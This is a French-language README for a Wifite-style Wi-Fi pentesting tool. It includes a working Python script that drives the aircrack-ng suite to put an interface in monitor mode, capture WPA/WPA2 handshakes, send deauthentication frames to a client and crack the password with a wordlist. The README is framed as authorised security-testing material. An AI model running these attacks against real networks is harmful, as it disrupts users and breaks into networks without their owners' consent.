# Wi-Fi Pentesting Tool (Type Wifite)

## Description

Ce projet est un outil de pentesting Wi-Fi en Python, inspiré de **Wifite**, qui automatise la détection de réseaux Wi-Fi, la capture de handshakes WPA/WPA2, et permet d'effectuer des attaques de désauthentification. L'outil utilise des programmes tels que `aircrack-ng`, `airodump-ng` et `aireplay-ng` pour interagir avec les interfaces réseau en mode monitor, capturer des paquets et tenter de craquer les mots de passe des réseaux Wi-Fi.

### ⚠️ Avertissement

Ce programme est uniquement destiné à des **fins éducatives** et de **tests de sécurité autorisés** (pentests légaux). Toute utilisation non autorisée de cet outil sur des réseaux Wi-Fi peut enfreindre la loi et entraîner des poursuites. N'utilisez cet outil que sur des réseaux pour lesquels vous avez l'autorisation expresse d'exécuter des tests de sécurité.

---

## Fonctionnalités

- Met en place l'interface Wi-Fi en mode monitor
- Scanne les réseaux Wi-Fi à proximité et capture les handshakes WPA/WPA2
- Effectue des attaques de désauthentification pour forcer la capture de handshakes
- Automatise le processus de craquage de mot de passe à l'aide de `aircrack-ng` et d'une liste de mots de passe
- Compatible avec les interfaces Wi-Fi qui supportent le mode monitor

---

## Prérequis

### Systèmes d'exploitation supportés

- **Linux** (Kali Linux ou toute distribution avec les outils de pentesting)

### Outils requis

- **Python 3.x**
- **Aircrack-ng** suite : `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`
- **Scapy** : bibliothèque pour la manipulation de paquets réseau
- **PyRIC** : bibliothèque pour interagir avec les interfaces Wi-Fi en Python

#### Installation des dépendances :

```bash
# Installation des outils Aircrack-ng
sudo apt-get install aircrack-ng

# Installation des bibliothèques Python
pip install scapy pyric
```
## Utilisation

### 1. Mettre l'interface Wi-Fi en mode monitor

Avant de pouvoir capturer des paquets réseau, l'interface Wi-Fi doit être configurée en mode monitor. Le script utilise `airmon-ng` pour automatiser cette étape.

### 2. Scanner les réseaux Wi-Fi

Lancez un scan pour détecter les réseaux Wi-Fi à proximité, afficher les ESSID (nom du réseau), BSSID (adresse MAC) et autres informations. Cela vous permet de choisir la cible à attaquer.

### 3. Capturer le handshake WPA/WPA2

Le script capture le handshake WPA/WPA2 pour les réseaux cryptés. Ce fichier de handshake sera ensuite utilisé pour tenter de craquer le mot de passe.

### 4. Désauthentifier un client

Vous pouvez forcer un client connecté à se déconnecter temporairement d'un réseau pour capturer le handshake de nouvelle connexion. Cette étape utilise `aireplay-ng` pour effectuer une attaque de désauthentification.

### 5. Craquer le mot de passe

Une fois le handshake capturé, vous pouvez tenter de craquer le mot de passe en utilisant un dictionnaire de mots de passe. Le script utilise `aircrack-ng` pour cela.

---

## Exemple d'utilisation

Voici un exemple de script Python pour automatiser ce processus :

```python
import subprocess

# Fonction pour passer l'interface en mode monitor
def set_monitor_mode(interface):
    subprocess.run(["airmon-ng", "start", interface])

# Fonction pour scanner les réseaux Wi-Fi
def scan_networks(interface):
    subprocess.run(["airodump-ng", interface])

# Fonction pour capturer un handshake WPA/WPA2
def capture_handshake(bssid, channel, output_file, interface):
    subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", output_file, interface])

# Fonction pour désauthentifier un client
def deauth_attack(bssid, client_mac, interface):
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, interface])

# Fonction pour tenter de craquer le mot de passe avec un handshake capturé
def crack_password(handshake_file, wordlist):
    subprocess.run(["aircrack-ng", "-w", wordlist, handshake_file])

# Exemple d'utilisation :
interface = "wlan0"  # Remplace par ton interface Wi-Fi

# Étape 1 : Mettre en mode monitor
set_monitor_mode(interface)

# Étape 2 : Scanner les réseaux Wi-Fi
scan_networks(interface + "mon")

# Étape 3 : Capture du handshake
bssid = "00:11:22:33:44:55"  # Remplace par le BSSID du réseau cible
channel = "6"  # Remplace par le canal du réseau cible
capture_handshake(bssid, channel, "handshake", interface + "mon")

# Étape 4 : Désauthentifier un client
client_mac = "66:77:88:99:AA:BB"  # Remplace par l'adresse MAC du client
deauth_attack(bssid, client_mac, interface + "mon")

# Étape 5 : Craquer le mot de passe
crack_password("handshake-01.cap", "wordlist.txt")
```
## Limitations

- Ce script est limité à l'automatisation des attaques Wi-Fi supportées par les outils `aircrack-ng`.
- La réussite du craquage de mot de passe dépend de la qualité du dictionnaire de mots de passe utilisé.
- Le matériel (carte Wi-Fi compatible avec le mode monitor) peut limiter les fonctionnalités.

---

## À propos de la sécurité

**⚠️ Utilisation responsable :** Cet outil ne doit être utilisé que sur des réseaux dont vous êtes propriétaire ou pour lesquels vous avez une autorisation explicite pour effectuer des tests de sécurité. L'utilisation non autorisée d'un outil de craquage de Wi-Fi est **illégale** dans de nombreux pays et peut avoir des conséquences légales sérieuses.

---

## Licence

Ce projet est publié sous la licence **MIT License**. Vous êtes libre de l'utiliser, de le modifier et de le distribuer, mais uniquement dans le cadre légal.

---

## Contributeurs

- Rakulan SIVATHASAN
- Contributions, suggestions et améliorations sont les bienvenues !

---

## Remarques finales

N'oubliez pas de toujours travailler de manière éthique et dans le respect de la loi lorsque vous utilisez des outils de pentesting.
